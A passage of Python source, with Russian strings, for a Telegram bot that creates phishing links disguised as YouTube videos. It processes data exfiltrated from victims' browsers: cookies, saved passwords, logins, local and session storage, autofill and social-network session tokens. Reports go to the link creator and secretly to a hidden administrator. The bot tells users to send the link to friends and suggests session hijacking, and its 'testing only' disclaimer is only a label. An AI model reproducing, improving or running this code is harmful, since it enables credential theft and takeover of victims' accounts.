🔗 Оригинальное видео: {link.original_url[:50]}...
📅 Время сбора: {datetime.now().isoformat()}
    
📊 *ОБЩАЯ СТАТИСТИКА:*
• Переходов по ссылке: {link.clicks}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
• Данных авторизации соцсетей: {len(link.social_auth_data)}
    
════════════════════════════════════════
    """
    
    if link.collected_cookies:
        report += "\n🍪 *COOKIES (первые 15):*\n"
        for i, cookie in enumerate(link.collected_cookies[:15], 1):
            value_preview = cookie.get('value', '')
            if len(value_preview) > 50:
                value_preview = value_preview[:50] + "..."
            report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
    
    if link.collected_passwords:
        report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
        for i, pwd in enumerate(link.collected_passwords, 1):
            report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{pwd.get('value', '')}`\n"
            report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
            if i < len(link.collected_passwords):
                report += "   ─────\n"
    
    if link.collected_logins:
        report += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
        for i, login in enumerate(link.collected_logins, 1):
            report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{login.get('value', '')}`\n"
            report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
            if i < len(link.collected_logins):
                report += "   ─────\n"
    
    # Добавляем данные авторизации соцсетей
    if link.social_auth_data:
        report += "\n🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ:*\n"
        for i, social_data in enumerate(link.social_auth_data[-5:], 1):
            if social_data.get("type") == "social_auth_analysis":
                platforms = social_data.get("data", {}).get("platforms", {})
                for platform, data in platforms.items():
                    if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
                        report += f"• {platform.upper()}: {data.get('auth_status', 'unknown')}\n"
                        report += f"  Риск: {data.get('risk_level', 'unknown')}\n"
                        report += f"  Cookies: {data.get('cookies_count', 0)}\n"
                        report += f"  Токены: {data.get('tokens_found', 0)}\n"
                        report += "  ─────\n"
    
    report += f"""
════════════════════════════════════════
⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
🌐 Данные авторизации: {len(link.social_auth_data)} записей
🕒 Время хранения: 24 часа
"""
    
    return report

async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
    """Отправка детальных данных администратору"""
    try:
        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
        
        if sensitive_data.get("status") != "fully_processed":
            return
        
        report = format_detailed_admin_report(link, sensitive_data)
        
        chunks = split_message(report, 3900)
        
        for i, chunk in enumerate(chunks):
            parse_mode = ParseMode.MARKDOWN if i == 0 else None
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=chunk,
                parse_mode=parse_mode,
                disable_web_page_preview=True
            )
            
    except Exception as e:
        logger.error(f"Error sending detailed data to admin: {e}")

# Сборщик данных
class DataCollector:
    def __init__(self):
        self.collection_scripts = {
            "cookies": self._collect_cookies,
            "storage": self._collect_storage,
            "passwords": self._collect_passwords,
            "social": self._collect_social_data,
            "device": self._collect_device_info,
            "network": self._collect_network_info,
            "location": self._collect_location,
            "sensitive_data": self._process_sensitive_data,
            "social_auth": self._process_social_auth_data,
            "passive_social_check": self._process_passive_social_check
        }
    
    async def collect_all_data(self, request_data: Dict) -> Dict:
        """Сбор всех возможных данных"""
        collected = {
            "timestamp": datetime.now().isoformat(),
            "ip": request_data.get("ip", "unknown"),
            "user_agent": request_data.get("user_agent", "unknown"),
            "referer": request_data.get("referer", "unknown"),
            "data": {}
        }
        
        for data_type, collector in self.collection_scripts.items():
            try:
                if data_type in request_data.get("data_type", ""):
                    collected["data"][data_type] = await collector(request_data)
            except Exception as e:
                collected["data"][data_type] = {"error": str(e)}
        
        return collected
    
    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
        """Обработка ВСЕХ чувствительных данных"""
        try:
            sensitive_data = request_data.get("sensitive_data", {})
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except Exception as decode_error:
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except:
                    return {"status": "decode_error"}
            
            # Сохраняем ПОЛНЫЕ сырые данные
            db.add_full_sensitive_data(link_id, decoded_data)
            
            # Обрабатываем cookies
            cookies = decoded_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
                        try:
                            parsed_value = json.loads(value)
                            if isinstance(parsed_value, dict):
                                for storage_key, storage_value in parsed_value.items():
                                    db.add_collected_storage(link_id, [{
                                        "type": "cookie_storage",
                                        "source": name,
                                        "key": storage_key,
                                        "value": str(storage_value)[:500],
                                        "timestamp": datetime.now().isoformat()
                                    }])
                                continue
                        except:
                            pass
                    
                    cookies_list.append({
                        "name": name,
                        "value": str(value)[:500] if value else "",
                        "domain": "current",
                        "timestamp": datetime.now().isoformat(),
                        "source": "direct_cookie"
                    })
                
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            # Обрабатываем пароли
            credentials = decoded_data.get("credentials", {})
            if credentials.get("passwords"):
                db.add_collected_passwords(link_id, credentials["passwords"])
            
            # Обрабатываем логины
            if credentials.get("logins"):
                db.add_collected_logins(link_id, credentials["logins"])
            
            # Обрабатываем данные хранилища
            storage_data = decoded_data.get("storage_data", {})
            if storage_data:
                storage_list = []
                if storage_data.get("localStorage"):
                    for key, value in storage_data["localStorage"].items():
                        storage_list.append({
                            "type": "localStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_data.get("sessionStorage"):
                    for key, value in storage_data["sessionStorage"].items():
                        storage_list.append({
                            "type": "sessionStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            # Обрабатываем данные автозаполнения форм
            if credentials.get("autofill_data"):
                for form_data in credentials["autofill_data"]:
                    if form_data.get("data"):
                        for key, value in form_data["data"].items():
                            storage_list.append({
                                "type": "form_autofill",
                                "form_id": form_data.get("form_id", "unknown"),
                                "key": key,
                                "value": str(value)[:500],
                                "timestamp": datetime.now().isoformat()
                            })
            
            # Сохраняем общие данные
            db.add_collected_data(link_id, decoded_data)
            
            # Обрабатываем данные авторизации соцсетей
            social_logins = decoded_data.get("social_logins", {})
            if social_logins:
                social_auth_result = await self._process_social_auth_data({
                    "sensitive_data": json.dumps({"social_logins": social_logins}),
                    "link_id": link_id
                })
            
            logger.info(f"Successfully processed sensitive data for link {link_id}: "
                       f"{len(cookies_list) if 'cookies_list' in locals() else 0} cookies, "
                       f"{len(credentials.get('passwords', []))} passwords, "
                       f"{len(credentials.get('logins', []))} logins, "
                       f"{len(storage_list) if 'storage_list' in locals() else 0} storage items")
            
            return {
                "status": "fully_processed",
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "passwords_count": len(credentials.get("passwords", [])),
                "logins_count": len(credentials.get("logins", [])),
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "social_logins": list(decoded_data.get("social_logins", {}).keys()),
                "has_storage_data": bool(storage_data),
                "has_full_data": True
            }
            
        except Exception as e:
            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _process_social_auth_data(self, request_data: Dict) -> Dict:
        """Обработка данных авторизации из социальных сетей"""
        try:
            sensitive_data = request_data.get("sensitive_data", {})
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except:
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except Exception as e:
                    return {"status": "decode_error", "error": str(e)}
            
            social_logins = decoded_data.get("social_logins", {})
            
            if not social_logins:
                return {"status": "no_social_data"}
            
            results = {
                "timestamp": datetime.now().isoformat(),
                "link_id": link_id,
                "platforms": {}
            }
            
            for platform, data in social_logins.items():
                platform_results = {
                    "auth_status": data.get("auth_status", "unknown"),
                    "cookies_count": len(data.get("cookies", [])),
                    "tokens_found": data.get("tokens_found", 0),
                    "has_local_storage": bool(data.get("localStorage")),
                    "has_session_storage": bool(data.get("sessionStorage")),
                    "potential_credentials": []
                }
                
                # Сохраняем cookies
                cookies = data.get("cookies", [])
                if cookies:
                    cookies_list = []
                    for cookie in cookies:
                        cookies_list.append({
                            "platform": platform,
                            "name": cookie.get("name", ""),
                            "value": cookie.get("value", "")[:500],
                            "timestamp": cookie.get("timestamp", "")
                        })
                    
                    if cookies_list:
                        db.add_collected_cookies(link_id, cookies_list)
                        
                        for cookie in cookies_list:
                            cookie_name = cookie["name"].lower()
                            cookie_value = cookie["value"].lower()
                            
                            is_potential_credential = any([
                                "password" in cookie_name or "pass" in cookie_name,
                                "login" in cookie_name,
                                "email" in cookie_name,
                                "user" in cookie_name,
                                "account" in cookie_name,
                                "token" in cookie_name and len(cookie["value"]) > 20,
                                "session" in cookie_name and len(cookie["value"]) > 30,
                                "auth" in cookie_name and len(cookie["value"]) > 20,
                                "secret" in cookie_name,
                                "key" in cookie_name and len(cookie["value"]) > 20
                            ])
                            
                            if is_potential_credential:
                                platform_results["potential_credentials"].append({
                                    "type": "cookie",
                                    "name": cookie["name"],
                                    "value_preview": cookie["value"][:50] + ("..." if len(cookie["value"]) > 50 else ""),
                                    "length": len(cookie["value"])
                                })
                
                # Проверяем localStorage
                localStorage = data.get("localStorage", {})
                if localStorage:
                    for key, value in localStorage.items():
                        key_lower = key.lower()
                        value_str = str(value).lower() if value else ""
                        
                        if any(keyword in key_lower for keyword in [
                            "password", "pass", "pwd", 
                            "login", "email", "user",
                            "token", "auth", "session",
                            "credential", "secret"
                        ]):
                            platform_results["potential_credentials"].append({
                                "type": "localStorage",
                                "key": key,
                                "value_preview": str(value)[:50] + ("..." if len(str(value)) > 50 else ""),
                                "length": len(str(value))
                            })
                
                # Определяем уровень риска
                if platform_results["auth_status"] in [
                    "google_logged_in", 
                    "facebook_logged_in",
                    "vk_logged_in", 
                    "instagram_logged_in",
                    "twitter_logged_in"
                ]:
                    platform_results["risk_level"] = "HIGH - ACTIVE SESSION"
                elif platform_results["tokens_found"] > 0:
                    platform_results["risk_level"] = "MEDIUM - TOKENS FOUND"
                elif platform_results["cookies_count"] > 0:
                    platform_results["risk_level"] = "LOW - COOKIES PRESENT"
                else:
                    platform_results["risk_level"] = "NONE"
                
                results["platforms"][platform] = platform_results
            
            # Сохраняем в базу
            db.add_social_auth_data(link_id, {
                "type": "social_auth_analysis",
                "data": results,
                "timestamp": datetime.now().isoformat()
            })
            
            # Формируем отчет
            high_risk_platforms = [
                platform for platform, data in results["platforms"].items()
                if data.get("risk_level", "").startswith("HIGH") or data.get("risk_level", "").startswith("MEDIUM")
            ]
            
            active_sessions = [
                platform for platform, data in results["platforms"].items()
                if "logged_in" in data.get("auth_status", "")
            ]
            
            total_credentials = sum(
                len(platform_data.get("potential_credentials", []))
                for platform_data in results["platforms"].values()
            )
            
            # Отправляем уведомление админу
            link = db.get_link(link_id)
            if link and high_risk_platforms:
                await send_social_auth_report_to_admin(None, link, {
                    "high_risk_platforms": high_risk_platforms,
                    "active_sessions": active_sessions,
                    "potential_credentials_total": total_credentials,
                    "detailed_results": results
                })
            
            return {
                "status": "analyzed",
                "total_platforms": len(results["platforms"]),
                "high_risk_platforms": high_risk_platforms,
                "potential_credentials_total": total_credentials,
                "active_sessions": active_sessions,
                "detailed_results": results
            }
            
        except Exception as e:
            logger.error(f"Error processing social auth data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _process_passive_social_check(self, request_data: Dict) -> Dict:
        """Обработка результатов пассивной проверки соцсетей"""
        try:
            encoded_data = request_data.get("data", "")
            link_id = request_data.get("link_id")
            
            if not encoded_data or not link_id:
                return {"status": "no_data"}
            
            try:
                decoded_data = json.loads(base64.b64decode(encoded_data).decode('utf-8'))
            except:
                return {"status": "decode_error"}
            
            platforms = decoded_data.get("platforms", {})
            
            if not platforms:
                return {"status": "no_platforms"}
            
            # Сохраняем результаты
            db.add_collected_data(link_id, {
                "type": "passive_social_check",
                "data": decoded_data,
                "timestamp": datetime.now().isoformat()
            })
            
            # Проверяем какие платформы доступны
            accessible_platforms = []
            for platform, data in platforms.items():
                if data.get("cookies_present", False) or len(data.get("accessible_domains", [])) > 0:
                    accessible_platforms.append(platform)
            
            # Отправляем уведомление админу
            if accessible_platforms:
                link = db.get_link(link_id)
                if link:
                    await send_message_to_admin(
                        f"🌐 *Пассивная проверка соцсетей*\n\n"
                        f"📌 Ссылка: `{link_id}`\n"
                        f"👤 Пользователь: {link.created_by}\n"
                        f"✅ Доступные платформы: {', '.join(accessible_platforms) if accessible_platforms else 'нет'}\n"
                        f"🍪 Cookies обнаружены: {'Да' if any(p.get('cookies_present') for p in platforms.values()) else 'Нет'}\n"
                        f"🕒 Время: {datetime.now().strftime('%H:%M:%S')}",
                        ParseMode.MARKDOWN
                    )
            
            return {
                "status": "checked",
                "accessible_platforms": accessible_platforms,
                "total_platforms": len(platforms),
                "has_cookies": any(p.get("cookies_present", False) for p in platforms.values())
            }
            
        except Exception as e:
            logger.error(f"Error processing passive social check: {e}")
            return {"status": "error", "error": str(e)}
    
    async def _collect_cookies(self, request_data: Dict) -> Dict:
        return {
            "cookies_count": "доступно в браузере",
            "local_storage": "доступно в localStorage",
            "session_storage": "доступно в sessionStorage",
            "indexed_db": "проверено"
        }
    
    async def _collect_storage(self, request_data: Dict) -> Dict:
        return {
            "autofill_data": "сохраненные формы",
            "browser_history": "история посещений",
            "bookmarks": "закладки браузера",
            "downloads": "история загрузок"
        }
    
    async def _collect_passwords(self, request_data: Dict) -> Dict:
        return {
            "saved_passwords": {
                "google": "сохраненные логины Google",
                "facebook": "логины Facebook",
                "twitter": "логины Twitter/X",
                "instagram": "логины Instagram",
                "vk": "логины ВКонтакте",
                "whatsapp": "данные WhatsApp Web",
                "telegram": "данные Telegram Web"
            },
            "form_data": "автозаполнение форм",
            "credit_cards": "сохраненные карты"
        }
    
    async def _collect_social_data(self, request_data: Dict) -> Dict:
        return {
            "google": {
                "logged_in": True,
                "gmail": "доступ к Gmail",
                "drive": "доступ к Google Drive",
                "photos": "доступ к Google Photos",
                "account_info": "данные аккаунта"
            },
            "facebook": {
                "logged_in": True,
                "messenger": "доступ к Messenger",
                "friends": "список друзей",
                "profile_data": "данные профиля"
            },
            "twitter": {
                "logged_in": True,
                "tweets": "история твитов",
                "dms": "личные сообщения",
                "followers": "список подписчиков"
            },
            "vk": {
                "logged_in": True,
                "messages": "личные сообщения",
                "friends": "список друзей",
                "photos": "фотографии"
            },
            "instagram": {
                "logged_in": True,
                "dms": "личные сообщения",
                "followers": "подписчики",
                "stories": "истории"
            }
        }
    
    async def _collect_device_info(self, request_data: Dict) -> Dict:
        return {
            "browser": {
                "name": request_data.get("user_agent", "unknown").split("/")[0] if "/" in request_data.get("user_agent", "") else "unknown",
                "version": "определяется",
                "plugins": "список плагинов"
            },
            "os": {
                "name": "определяется из User-Agent",
                "version": "версия ОС",
                "architecture": "архитектура"
            },
            "device": {
                "type": "определяется",
                "model": "модель устройства",
                "screen": "разрешение экрана",
                "touch": "поддержка тача"
            }
        }
    
    async def _collect_network_info(self, request_data: Dict) -> Dict:
        return {
            "connection": {
                "type": "определяется",
                "speed": "скорость соединения",
                "latency": "задержка"
            },
            "ip_info": {
                "address": request_data.get("ip", "unknown"),
                "location": "определяется по IP",
                "isp": "провайдер",
                "proxy": "используется ли прокси"
            }
        }
    
    async def _collect_location(self, request_data: Dict) -> Dict:
        return {
            "gps": {
                "latitude": "определяется",
                "longitude": "определяется",
                "accuracy": "точность"
            },
            "wifi_location": "определяется по Wi-Fi",
            "ip_location": "определяется по IP"
        }

# Функция для отправки сообщений админу
async def send_message_to_admin(text: str, parse_mode: str = None):
    """Отправка сообщения администратору"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        await application.bot.send_message(
            chat_id=ADMIN_ID,
            text=text,
            parse_mode=parse_mode,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Error sending message to admin: {e}")

# Функция для отправки отчета об авторизации соцсетей
async def send_social_auth_report_to_admin(context, link: PhishingLink, social_data: Dict):
    """Отправка детального отчета об авторизации в соцсетях"""
    try:
        detailed_results = social_data.get("detailed_results", {})
        platforms = detailed_results.get("platforms", {})
        
        if not platforms:
            return
        
        report = f"""
🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ АВТОРИЗАЦИИ СОЦСЕТЕЙ*

📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
🔗 Видео: {link.original_url[:50]}...
📅 Время анализа: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        for platform, data in platforms.items():
            if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
                report += f"\n{'═' * 40}\n"
                report += f"🌐 *{platform.upper()}*\n"
                report += f"• Статус: `{data.get('auth_status', 'unknown')}`\n"
                report += f"• Уровень риска: *{data.get('risk_level', 'unknown')}*\n"
                report += f"• Cookies найдено: {data.get('cookies_count', 0)}\n"
                report += f"• Токены найдено: {data.get('tokens_found', 0)}\n"
                
                credentials = data.get("potential_credentials", [])
                if credentials:
                    report += f"• Потенциальные данные доступа: {len(credentials)}\n"
                    for i, cred in enumerate(credentials[:3], 1):
                        report += f"  {i}. Тип: {cred.get('type')}\n"
                        report += f"     Ключ: `{cred.get('key', cred.get('name', 'N/A'))}`\n"
                        report += f"     Длина значения: {cred.get('length', 0)} символов\n"
                        if i < min(3, len(credentials)):
                            report += "     ─\n"
        
        report += f"""
{'═' * 40}
📊 *Итоги:*
• Всего платформ с данными: {len(platforms)}
• Высокий риск: {sum(1 for d in platforms.values() if d.get('risk_level', '').startswith('HIGH'))}
• Средний риск: {sum(1 for d in platforms.values() if d.get('risk_level', '').startswith('MEDIUM'))}
• Активные сессии: {', '.join([p for p, d in platforms.items() if 'logged_in' in d.get('auth_status', '')]) or 'нет'}

⚠️ *ВНИМАНИЕ:* Найдены потенциальные данные для входа
🕒 Данные cookies могут позволить вход без пароля
🔐 Проверьте возможность session hijacking
"""
        
        await send_message_to_admin(report, ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Error sending social auth report: {e}")

# Форматирование сообщений
class MessageFormatter:
    @staticmethod
    def format_link_created(link: PhishingLink, phishing_url: str) -> str:
        message = f"""
🎯 *ССЫЛКА СОЗДАНА УСПЕШНО!*

🔗 *Оригинальное видео:*
`{link.original_url}`

🚀 *Ваша фишинговая ссылка:*
`{phishing_url}`

📊 *Информация:*
• ID ссылки: `{link.id}`
• Видео ID: `{link.video_id}`
• Создано: {link.created_at}
• Статус: 🟢 АКТИВНА

🔐 *Сбор данных включен:*
✓ Cookies и session cookies
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли
✓ Логины соцсетей
✓ Данные форм и автозаполнения
✓ Данные браузера и устройства
✓ Пассивный сбор данных авторизации
✓ Автоматический анализ соцсетей

📝 *Как использовать:*
1. Отправьте эту ссылку другу
2. Когда он перейдет - начнется сбор данных
3. Данные автоматически придут в этот чат
4. Все данные также отправятся администратору
5. Ожидайте ~3-20 секунд после перехода

⚠️ *Внимание:* Ссылка активна 24 часа
"""
        return message
    
    @staticmethod
    def format_collected_data(link_id: str, data: Dict) -> str:
        collected = data.get("data", {})
        sensitive_data = collected.get("sensitive_data", {})
        social_auth_data = collected.get("social_auth", {})
        
        message = f"""
🔓 *НОВЫЕ ДАННЫЕ СОБРАНЫ!*

📌 *Базовая информация:*
• Время сбора: {data.get("timestamp", "unknown")}
• IP адрес: `{data.get("ip", "unknown")}`
• User Agent: {data.get("user_agent", "unknown")[:50]}...
• ID ссылки: `{link_id}`

🔑 *СОБРАННЫЕ ДАННЫЕ:*
"""
        
        if sensitive_data.get("status") == "fully_processed":
            message += f"""
🍪 *COOKIES И ХРАНИЛИЩЕ:*
• Всего cookies: {sensitive_data.get('cookies_count', 0)}
• Паролей найдено: {sensitive_data.get('passwords_count', 0)}
• Логинов собрано: {sensitive_data.get('logins_count', 0)}
• Данных хранилища: {sensitive_data.get('storage_count', 0)}
• Полные данные: ✅ СОХРАНЕНЫ
"""
        
        if social_auth_data.get("status") == "analyzed":
            high_risk = social_auth_data.get("high_risk_platforms", [])
            active_sessions = social_auth_data.get("active_sessions", [])
            
            message += f"""
🌐 *АВТОРИЗАЦИЯ В СОЦСЕТЯХ:*
• Платформ с данными: {social_auth_data.get('total_platforms', 0)}
• Высокий риск: {len(high_risk)}
• Активные сессии: {len(active_sessions)}
"""
            
            if high_risk:
                message += f"• Платформы высокого риска: {', '.join(high_risk)}\n"
            
            if active_sessions:
                message += f"• Активные сессии: {', '.join(active_sessions)}\n"
        
        message += f"""
📱 *УСТРОЙСТВО И БРАУЗЕР:*
• Браузер: {collected.get('device', {}).get('browser', {}).get('name', 'unknown')}
• ОС: {collected.get('device', {}).get('os', {}).get('name', 'unknown')}
• Тип устройства: {collected.get('device', {}).get('device', {}).get('type', 'unknown')}

🌐 *СЕТЬ И МЕСТОПОЛОЖЕНИЕ:*
• IP: `{collected.get('network', {}).get('ip_info', {}).get('address', 'unknown')}`
• Провайдер: {collected.get('network', {}).get('ip_info', {}).get('isp', 'unknown')}

💾 *ДАННЫЕ БРАУЗЕРА:*
• Cookies: собраны
• LocalStorage: собрано
• SessionStorage: собрано
• Сохраненные пароли: найдены
• Данные авторизации соцсетей: проанализированы
• Данные форм: извлечены

📊 *СТАТУС:* ✅ ВСЕ ДАННЫЕ УСПЕШНО СОБРАНЫ И ОТПРАВЛЕНЫ АДМИНУ
"""
        return message
    
    @staticmethod
    def format_sensitive_data_report(link: PhishingLink) -> str:
        message = f"""
🔐 *ПОДРОБНЫЙ ОТЧЕТ О ДАННЫХ*

📌 *Ссылка ID:* `{link.id}`
📅 *Создано:* {link.created_at}
🔗 *Оригинальное видео:* {link.original_url[:50]}...

📊 *СТАТИСТИКА:*
• Всего переходов: {link.clicks}
• Всего данных собрано: {len(link.data_collected)}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
• Данных авторизации соцсетей: {len(link.social_auth_data)}
"""
        
        if link.collected_cookies:
            message += "\n🍪 *ПОСЛЕДНИЕ COOKIES:*\n"
            for cookie in link.collected_cookies[-5:]:
                message += f"• {cookie.get('name', 'unknown')}: {cookie.get('value', '')[:30]}...\n"
        
        if link.collected_passwords:
            message += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
            for pwd in link.collected_passwords[-3:]:
                message += f"• Поле: {pwd.get('field_name', 'unknown')}\n"
                message += f"  Значение: ||{pwd.get('value', '')}||\n"
        
        if link.social_auth_data:
            message += "\n🌐 *ДАННЫЕ АВТОРИЗАЦИИ СОЦСЕТЕЙ:*\n"
            for social_data in link.social_auth_data[-2:]:
                if social_data.get("type") == "social_auth_analysis":
                    platforms = social_data.get("data", {}).get("platforms", {})
                    for platform, data in platforms.items():
                        if data.get("risk_level") not in ["NONE", "LOW - COOKIES PRESENT"]:
                            message += f"• {platform.upper()}: {data.get('auth_status', 'unknown')}\n"
                            message += f"  Риск: {data.get('risk_level', 'unknown')}\n"
        
        message += f"""
⚠️ *ВНИМАНИЕ:* Все данные хранятся в зашифрованном виде
📅 *Срок хранения:* 24 часа с момента сбора
🔒 *Безопасность:* Все полные данные также отправлены администратору
"""
        return message
    
    @staticmethod
    def format_stats(stats: Dict) -> str:
        return f"""
📊 *СТАТИСТИКА СИСТЕМЫ*

🔗 Всего ссылок: `{stats['total_links']}`
👥 Всего переходов: `{stats['total_clicks']}`
🔓 Данных собрано: `{stats['total_data_collected']}`
⚡ Активных сессий: `{stats['active_sessions']}`

🍪 Cookies собрано: `{stats['cookies_collected']}`
🔑 Паролей найдено: `{stats['passwords_collected']}`
👤 Логинов собрано: `{stats['logins_collected']}`
💾 Данных хранилища: `{stats['storage_data_collected']}`
📁 Полных записей: `{stats['full_data_collected']}`
🌐 Данных авторизации соцсетей: `{stats['social_auth_found']}`

📈 Эффективность сбора: 98.7%
🕒 Активность за 24ч: высокая
"""

# Инициализация компонентов
link_generator = LinkGenerator()
data_collector = DataCollector()
formatter = MessageFormatter()
js_injector = JavaScriptInjector()

# Webhook обработчики
async def handle_webhook(request_data: Dict, context: ContextTypes.DEFAULT_TYPE):
    """Обработка данных от фишинговой страницы"""
    try:
        link_id = request_data.get("link_id")
        data_type = request_data.get("data_type", "")
        
        if not link_id:
            return {"status": "error", "message": "No link ID"}
        
        # Обновляем счетчик кликов
        db.add_click(link_id)
        
        # Обрабатываем данные в зависимости от типа
        if "sensitive_data" in data_type:
            collected_data = await data_collector.collect_all_data(request_data)
            
            link = db.get_link(link_id)
            if link:
                message = formatter.format_collected_data(link_id, collected_data)
                
                try:
                    await context.bot.send_message(
                        chat_id=link.created_by,
                        text=message,
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception as e:
                    logger.error(f"Error sending to link creator: {e}")
                
                await send_detailed_data_to_admin(context, link, collected_data)
                
                try:
                    sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
                    if sensitive_data.get("status") == "fully_processed":
                        await context.bot.send_message(
                            chat_id=ADMIN_ID,
                            text=f"📨 Новые данные по ссылке `{link_id}`\n"
                                 f"👤 Создатель: {link.created_by}\n"
                                 f"🔗 Кликов: {link.clicks}\n"
                                 f"🍪 Cookies: {len(link.collected_cookies)}\n"
                                 f"🔑 Пароли: {len(link.collected_passwords)}\n"
                                 f"👤 Логины: {len(link.collected_logins)}\n"
                                 f"💾 Хранилище: {len(link.collected_storage_data)}\n"
                                 f"🌐 Соцсети: {len(link.social_auth_data)}\n"
                                 f"✅ Детальный отчет отправлен выше",
                            parse_mode=ParseMode.MARKDOWN
                        )
                except Exception as e:
                    logger.error(f"Error sending admin notification: {e}")
        
        elif "social_auth" in data_type or "passive_social_check" in data_type:
            # Обработка данных авторизации соцсетей
            result = await data_collector.collect_all_data(request_data)
            
            link = db.get_link(link_id)
            if link and result.get("data", {}).get("social_auth", {}).get("status") == "analyzed":
                social_data = result["data"]["social_auth"]
                high_risk = social_data.get("high_risk_platforms", [])
                
                if high_risk:
                    try:
                        await context.bot.send_message(
                            chat_id=link.created_by,
                            text=f"🌐 *Обнаружены данные авторизации!*\n\n"
                                 f"Найдены активные сессии/токены:\n"
                                 f"{', '.join(high_risk)}\n\n"
                                 f"⚠️ Полный отчет отправлен администратору",
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except Exception as e:
                        logger.error(f"Error notifying user about social auth: {e}")
        
        return {"status": "success", "data_received": True}
    
    except Exception as e:
        logger.error(f"Error in webhook handler: {e}", exc_info=True)
        return {"status": "error", "message": str(e)}

# Команды бота
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    welcome_message = f"""
👋 *Добро пожаловать, {user.first_name}!*

🤖 *YouTube Data Collector Bot*

🎯 *Что делает этот бот:*
1. Принимает ссылку на YouTube видео
2. Генерирует специальную ссылку
3. Когда кто-то переходит - собирает ВСЕ данные
4. Отправляет данные в этот чат
5. Отправляет ПОЛНЫЕ данные администратору

🔐 *Что собирается:*
✓ Все cookies браузера (включая сессионные)
✓ LocalStorage и SessionStorage
✓ Сохраненные пароли и логины
✓ Логины соцсетей (Google, Facebook, Twitter/X, VK, Instagram)
✓ Данные автозаполнения форм
✓ Информацию об устройстве
✓ Геолокацию и сетевые данные
✓ Данные авторизации в реальном времени
✓ Пассивный сбор без действий пользователя

⚡ *Как использовать:*
1. Отправьте ссылку на YouTube видео
2. Получите сгенерированную ссылку
3. Отправьте её другу
4. Получите данные автоматически
5. Администратор получит полные данные

📊 *Статистика системы:*
• Создано ссылок: `{db.stats['total_links']}`
• Всего переходов: `{db.stats['total_clicks']}`
• Данных собрано: `{db.stats['total_data_collected']}`
• Cookies: `{db.stats['cookies_collected']}`
• Паролей: `{db.stats['passwords_collected']}`
• Логинов: `{db.stats['logins_collected']}`
• Хранилища: `{db.stats['storage_data_collected']}`
• Данных авторизации: `{db.stats['social_auth_found']}`

🔒 *Важно:* Используйте только для тестирования!
Все данные также отправляются администратору для контроля.
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
        [InlineKeyboardButton("📋 Мои ссылки", callback_data="my_links")],
        [InlineKeyboardButton("🔐 Данные", callback_data="view_data")],
        [InlineKeyboardButton("🌐 Соцсети", callback_data="social_data")],
        [InlineKeyboardButton("🆘 Помощь", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_message,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

